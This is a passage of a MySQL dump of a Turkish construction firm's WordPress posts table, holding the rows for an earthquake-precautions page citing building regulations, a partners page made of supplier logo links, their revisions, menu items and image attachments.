en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-revision-v1","","","2014-08-29 22:47:43","2014-08-29 19:47:43","","944","http://herkonyapi.com/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("939","1","2014-08-29 22:42:00","2014-08-29 19:42:00","Çevre ve Şehircilik Bakanlığı, İstanbul\'da bina yönetmelikleri ile ilgili olarak İnşaat Mühendislerine eğitim veriyor. Bu deprem eğitimleri Eskişehir, Samsun, Nevşehir, Trabzon, Çanakkale, Gaziantep ve İzmir\'de de veriliyor.

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/03/20070306-3.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında esaslar, 6 Mart 2007 Salı günü 26454 sayılı Resmi Gazete\'de yayınlandı.</a>

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/05/20070503-8.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında yönetmelikte değişiklik yapılmasına ilişkin yönetmelik, 3 Mayıs 2007 tarihinde ve 26511 sayılı Resmi Gazete\'de yayınlandı.</a>
<p style=\"text-align: center;\"><a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png\"><img class=\"size-full wp-image-940 aligncenter\" alt=\"deprem-gercegi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png\" width=\"683\" height=\"882\" /></a></p>","Deprem Tedbirleri","","publish","open","open","","deprem-tedbirleri","","","2014-10-06 15:33:35","2014-10-06 12:33:35","","0","http://herkonyapi.com/?page_id=939","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("940","1","2014-08-29 22:41:28","2014-08-29 19:41:28","","deprem-gercegi","","inherit","open","open","","deprem-gercegi","","","2014-08-29 22:41:28","2014-08-29 19:41:28","","939","http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("941","1","2014-08-29 22:42:00","2014-08-29 19:42:00","Çevre ve Şehircilik Bakanlığı, İstanbul\'da bina yönetmelikleri ile ilgili olarak İnşaat Mühendislerine eğitim veriyor. Bu deprem eğitimleri Eskişehir, Samsun, Nevşehir, Trabzon, Çanakkale, Gaziantep ve İzmir\'de de veriliyor.

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/03/20070306-3.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında esaslar, 6 Mart 2007 Salı günü 26454 sayılı Resmi Gazete\'de yayınlandı.</a>

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/05/20070503-8.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında yönetmelikte değişiklik yapılmasına ilişkin yönetmelik, 3 Mayıs 2007 tarihinde ve 26511 sayılı Resmi Gazete\'de yayınlandı.</a>

<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png\"><img class=\"alignnone size-full wp-image-940\" alt=\"deprem-gercegi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png\" width=\"683\" height=\"882\" /></a>","Deprem Tedbirleri","","inherit","open","open","","939-revision-v1","","","2014-08-29 22:42:00","2014-08-29 19:42:00","","939","http://herkonyapi.com/939-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("942","1","2014-08-29 22:42:29","2014-08-29 19:42:29"," ","","","publish","open","open","","942","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=942","7","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("943","1","2014-08-29 22:42:29","2014-08-29 19:42:29"," ","","","publish","open","open","","943","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=943","8","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("946","1","2014-08-29 22:48:07","2014-08-29 19:48:07","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\"><img class=\"alignnone size-full wp-image-951\" alt=\"baykaralar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\"><img class=\"alignnone size-full wp-image-952\" alt=\"canakkale_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\"><img class=\"alignnone size-full wp-image-953\" alt=\"day_yapi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\"><img class=\"alignnone size-full wp-image-954\" alt=\"kabinet\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\"><img class=\"alignnone size-full wp-image-955\" alt=\"KlimaPlus\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\"><img class=\"alignnone size-full wp-image-956\" alt=\"logo_0000_mood\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\"><img class=\"alignnone size-full wp-image-957\" alt=\"logo_0001_drlight1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\"><img class=\"alignnone size-full wp-image-958\" alt=\"logo_0002_yutas1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\"><img class=\"alignnone size-full wp-image-959\" alt=\"logo_0003_vitra\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\"><img class=\"alignnone size-full wp-image-960\" alt=\"logo_0004_viko1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\"><img class=\"alignnone size-full wp-image-961\" alt=\"logo_0005_siemens1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\"><img class=\"alignnone size-full wp-image-962\" alt=\"logo_0007_seranit1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\"><img class=\"alignnone size-full wp-image-963\" alt=\"logo_0008_scavolini1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\"><img class=\"alignnone size-full wp-image-964\" alt=\"logo_0009_rehau1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\"><img class=\"alignnone size-full wp-image-965\" alt=\"logo_0010_onalanlar1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\"><img class=\"alignnone size-full wp-image-966\" alt=\"logo_0011_lineadecor1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\"><img class=\"alignnone size-full wp-image-967\" alt=\"logo_0012_legrand1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\" width=\"200\" height=\"125\" /><a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg\"><img class=\"alignnone size-full wp-image-988\" alt=\"ege_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg\" width=\"250\" height=\"69\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif\"><img class=\"alignnone size-full wp-image-989\" alt=\"franke\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif\" width=\"130\" height=\"42\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png\"><img class=\"alignnone size-full wp-image-990\" alt=\"mitsubishi_klima\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png\" width=\"228\" height=\"75\" /></a></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\"><img class=\"alignnone size-full wp-image-968\" alt=\"logo_0013_kommerling1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\"><img class=\"alignnone size-full wp-image-969\" alt=\"logo_0014_intema\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\"><img class=\"alignnone size-full wp-image-970\" alt=\"logo_0015_huni1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\"><img class=\"alignnone size-full wp-image-971\" alt=\"logo_0016_hoppe1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\"><img class=\"alignnone size-full wp-image-972\" alt=\"logo_0018_fibrobeton1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\"><img class=\"alignnone size-full wp-image-973\" alt=\"logo_0019_betofiber1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\"><img class=\"alignnone size-full wp-image-974\" alt=\"logo_0020_aparici1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\"><img class=\"alignnone size-full wp-image-975\" alt=\"logo_0021_innsu\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\"><img class=\"alignnone size-full wp-image-976\" alt=\"logo_0022_eskiz\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\"><img class=\"alignnone size-full wp-image-977\" alt=\"logo_0023_toskar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\"><img class=\"alignnone size-full wp-image-978\" alt=\"md_prekast\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\"><img class=\"alignnone size-full wp-image-979\" alt=\"okcam_mobilya\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\"><img class=\"alignnone size-full wp-image-980\" alt=\"Pimapen-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\"><img class=\"alignnone size-full wp-image-981\" alt=\"seldur_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\"><img class=\"alignnone size-full wp-image-982\" alt=\"serifoglu-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\"><img class=\"alignnone size-full wp-image-983\" alt=\"seyithanoglu_ahsap\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\"><img class=\"alignnone size-full wp-image-984\" alt=\"tepe_insaat_malzemeleri\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\"><img class=\"alignnone size-full wp-image-985\" alt=\"Winsa-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\"><img class=\"alignnone size-full wp-image-986\" alt=\"yuksel_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\" width=\"173\" height=\"108\" /></a>","Çözüm Ortakları","","publish","open","open","","cozum-ortaklari","","","2014-08-29 23:11:40","2014-08-29 20:11:40","","0","http://herkonyapi.com/?page_id=946","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("947","1","2014-08-29 22:48:07","2014-08-29 19:48:07","","Çözüm Ortakları","","inherit","open","open","","946-revision-v1","","","2014-08-29 22:48:07","2014-08-29 19:48:07","","946","http://herkonyapi.com/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("948","1","2014-08-29 22:48:52","2014-08-29 19:48:52"," ","","","publish","open","open","","948","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=948","4","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("949","1","2014-08-29 22:48:52","2014-08-29 19:48:52"," ","","","publish","open","open","","949","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=949","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("950","1","2014-08-29 22:50:20","2014-08-29 19:50:20","","Kurumsal","","publish","open","open","","kurumsal","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=950","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("953","1","2014-08-29 22:55:20","2014-08-29 19:55:20","","day_yapi","","inherit","open","open","","day_yapi","","","2014-08-29 22:55:20","2014-08-29 19:55:20","","946","http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("954","1","2014-08-29 22:55:22","2014-08-29 19:55:22","","kabinet","","inherit","open","open","","kabinet","","","2014-08-29 22:55:22","2014-08-29 19:55:22","","946","http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("955","1","2014-08-29 22:55:23","2014-08-29 19:55:23","","KlimaPlus","","inherit","open","open","","klimaplus","","","2014-08-29 22:55:23","2014-08-29 19:55:23","","946","http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("956","1","2014-08-29 22:55:26","2014-08-29 19:55:26","","logo_0000_mood","","inherit","open","open","","logo_0000_mood","","","2014-08-29 22:55:26","2014-08-29 19:55:26","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("957","1","2014-08-29 22:55:28","2014-08-29 19:55:28","","logo_0001_drlight1","","inherit","open","open","","logo_0001_drlight1","","","2014-08-29 22:55:28","2014-08-29 19:55:28","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("958","1","2014-08-29 22:55:30","2014-08-29 19:55:30","","logo_0002_yutas1","","inherit","open","open","","logo_0002_yutas1","","","2014-08-29 22:55:30","2014-08-29 19:55:30","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("959","1","2014-08-29 22:55:32","2014-08-29 19:55:32","","logo_0003_vitra","","inherit","open","open","","logo_0003_vitra","","","2014-08-29 22:55:32","2014-08-29 19:55:32","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("960","1","2014-08-29 22:55:34","2014-08-29 19:55:34","","logo_0004_viko1","","inherit","open","open","","logo_0004_viko1","","","2014-08-29 22:55:34","2014-08-29 19:55:34","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("961","1","2014-08-29 22:55:36","2014-08-29 19:55:36","","logo_0005_siemens1","","inherit","open","open","","logo_0005_siemens1","","","2014-08-29 22:55:36","2014-08-29 19:55:36","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("962","1","2014-08-29 22:55:38","2014-08-29 19:55:38","","logo_0007_seranit1","","inherit","open","open","","logo_0007_seranit1","","","2014-08-29 22:55:38","2014-08-29 19:55:38","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("963","1","2014-08-29 22:55:40","2014-08-29 19:55:40","","logo_0008_scavolini1","","inherit","open","open","","logo_0008_scavolini1","","","2014-08-29 22:55:40","2014-08-29 19:55:40","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("964","1","2014-08-29 22:55:42","2014-08-29 19:55:42","","logo_0009_rehau1","","inherit","open","open","","logo_0009_rehau1","","","2014-08-29 22:55:42","2014-08-29 19:55:42","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("965","1","2014-08-29 22:55:54","2014-08-29 19:55:54","","logo_0010_onalanlar1","","inherit","open","open","","logo_0010_onalanlar1","","","2014-08-29 22:55:54","2014-08-29 19:55:54","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("966","1","2014-08-29 22:55:56","2014-08-29 19:55:56","","logo_0011_lineadecor1","","inherit","open","open","","logo_0011_lineadecor1","","","2014-08-29 22:55:56","2014-08-29 19:55:56","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("967","1","2014-08-29 22:55:57","2014-08-29 19:55:57","","logo_0012_legrand1","","inherit","open","open","","logo_0012_legrand1","","","2014-08-29 22:55:57","2014-08-29 19:55:57","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("968","1","2014-08-29 22:55:59","2014-08-29 19:55:59","","logo_0013_kommerling1","","inherit","open","open","","logo_0013_kommerling1","","","2014-08-29 22:55:59","2014-08-29 19:55:59","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("969","1","2014-08-29 22:56:01","2014-08-29 19:56:01","","logo_0014_intema","","inherit","open","open","","logo_0014_intema","","","2014-08-29 22:56:01","2014-08-29 19:56:01","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("970","1","2014-08-29 22:56:04","2014-08-29 19:56:04","","logo_0015_huni1","","inherit","open","open","","logo_0015_huni1","","","2014-08-29 22:56:04","2014-08-29 19:56:04","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("971","1","2014-08-29 22:56:05","2014-08-29 19:56:05","","logo_0016_hoppe1","","inherit","open","open","","logo_0016_hoppe1","","","2014-08-29 22:56:05","2014-08-29 19:56:05","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("972","1","2014-08-29 22:56:07","2014-08-29 19:56:07","","logo_0018_fibrobeton1","","inherit","open","open","","logo_0018_fibrobeton1","","","2014-08-29 22:56:07","2014-08-29 19:56:07","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("973","1","2014-08-29 22:56:08","2014-08-29 19:56:08","","logo_0019_betofiber1","","inherit","open","open","","logo_0019_betofiber1","","","2014-08-29 22:56:08","2014-08-29 19:56:08","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("974","1","2014-08-29 22:56:10","2014-08-29 19:56:10","","logo_0020_aparici1","","inherit","open","open","","logo_0020_aparici1","","","2014-08-29 22:56:10","2014-08-29 19:56:10","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("975","1","2014-08-29 22:56:12","2014-08-29 19:56:12","","logo_0021_innsu","","inherit","open","open","","logo_0021_innsu","","","2014-08-29 22:56:12","2014-08-29 19:56:12","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("976","1","2014-08-29 22:56:13","2014-08-29 19:56:13","","logo_0022_eskiz","","inherit","open","open","","logo_0022_eskiz","","","2014-08-29 22:56:13","2014-08-29 19:56:13","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("977","1","2014-08-29 22:56:15","2014-08-29 19:56:15","","logo_0023_toskar","","inherit","open","open","","logo_0023_toskar","","","2014-08-29 22:56:15","2014-08-29 19:56:15","","946","http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("978","1","2014-08-29 22:56:17","2014-08-29 19:56:17","","md_prekast","","inherit","open","open","","md_prekast","","","2014-08-29 22:56:17","2014-08-29 19:56:17","","946","http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("979","1","2014-08-29 22:56:18","2014-08-29 19:56:18","","okcam_mobilya","","inherit","open","open","","okcam_mobilya","","","2014-08-29 22:56:18","2014-08-29 19:56:18","","946","http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("980","1","2014-08-29 22:56:20","2014-08-29 19:56:20","","Pimapen-011","","inherit","open","open","","pimapen-011","","","2014-08-29 22:56:20","2014-08-29 19:56:20","","946","http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("981","1","2014-08-29 22:56:21","2014-08-29 19:56:21","","seldur_elektrik","","inherit","open","open","","seldur_elektrik","","","2014-08-29 22:56:21","2014-08-29 19:56:21","","946","http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("982","1","2014-08-29 22:56:23","2014-08-29 19:56:23","","serifoglu-011","","inherit","open","open","","serifoglu-011","","","2014-08-29 22:56:23","2014-08-29 19:56:23","","946","http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("983","1","2014-08-29 22:56:25","2014-08-29 19:56:25","","seyithanoglu_ahsap","","inherit","open","open","","seyithanoglu_ahsap","","","2014-08-29 22:56:25","2014-08-29 19:56:25","","946","http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("984","1","2014-08-29 22:56:28","2014-08-29 19:56:28","","tepe_insaat_malzemeleri","","inherit","open","open","","tepe_insaat_malzemeleri","","","2014-08-29 22:56:28","2014-08-29 19:56:28","","946","http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("985","1","2014-08-29 22:56:29","2014-08-29 19:56:29","","Winsa-011","","inherit","open","open","","winsa-011","","","2014-08-29 22:56:29","2014-08-29 19:56:29","","946","http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("986","1","2014-08-29 22:56:32","2014-08-29 19:56:32","","yuksel_elektrik","","inherit","open","open","","yuksel_elektrik","","","2014-08-29 22:56:32","2014-08-29 19:56:32","","946","http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("987","1","2014-08-29 22:58:10","2014-08-29 19:58:10","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\"><img class=\"alignnone size-full wp-image-951\" alt=\"baykaralar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\"><img class=\"alignnone size-full wp-image-952\" alt=\"canakkale_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\"><img class=\"alignnone size-full wp-image-953\" alt=\"day_yapi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\"><img class=\"alignnone size-full wp-image-954\" alt=\"kabinet\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\"><img class=\"alignnone size-full wp-image-955\" alt=\"KlimaPlus\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\"><img class=\"alignnone size-full wp-image-956\" alt=\"logo_0000_mood\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\"><img class=\"alignnone size-full wp-image-957\" alt=\"logo_0001_drlight1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\"><img class=\"alignnone size-full wp-image-958\" alt=\"logo_0002_yutas1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\"><img class=\"alignnone size-full wp-image-959\" alt=\"logo_0003_vitra\" 